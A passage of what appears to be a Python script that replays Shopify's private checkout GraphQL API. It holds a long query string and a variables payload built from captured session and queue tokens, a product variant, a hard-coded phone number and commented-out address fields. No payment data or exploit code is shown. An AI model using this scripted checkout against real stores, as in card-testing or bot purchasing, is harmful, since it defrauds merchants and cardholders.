__typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}',
            'variables': {
                'input': {
                    'sessionInput': {
                        'sessionToken': x_checkout_one_session_token,
                    },
                    'queueToken': queue_token,
                    'discounts': {
                        'lines': [],
                        'acceptUnexpectedDiscounts': True,
                    },
                    'delivery': {
                        'deliveryLines': [
                            {
                                # 'destination': {
                                #     'streetAddress': {
                                #         'address1': addr["address1"],
                                #         'city': addr["city"],
                                #         'countryCode': addr["countryCode"],
                                #         'postalCode': addr["postalCode"],
                                #         'firstName': 'Laka',
                                #         'lastName': 'Lama',
                                #         'zoneCode': addr["zoneCode"],
                                #         'phone': addr["phone"],
                                #         'oneTimeUse': False,
                                #     },
                                # },
                                'selectedDeliveryStrategy': {
                                    # 'deliveryStrategyByHandle': {
                                    #     'handle': handle,
                                    #     'customDeliveryRate': False,
                                    # },
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {
                                            'any': True,
                                        },
                                        'shipments': {
                                            'any': True,
                                        },
                                    },
                                    'options': {
                                        'phone': '12195154586',
                                    },
                                },
                                'targetMerchandiseLines': {
                                    'lines': [
                                        {
                                            'stableId': stable_id,
                                        },
                                    ],
                                },
                                'deliveryMethodTypes': [
                                    f'{DMT}',
                                ],
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': f'{amount}',
                                        'currencyCode': f'{addr["currencyCode"]}',
                                    },
                                },
                                'destinationChanged': False,
                            },
                        ],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': [],
                    },
                    'merchandise': {
                        'merchandiseLines': [
                            {
                                'stableId': stable_id,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                        'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None,
                                    },
                                },
                                'quantity': {
                                    'items': {
                                        'value': 1,
                                    },
                                },
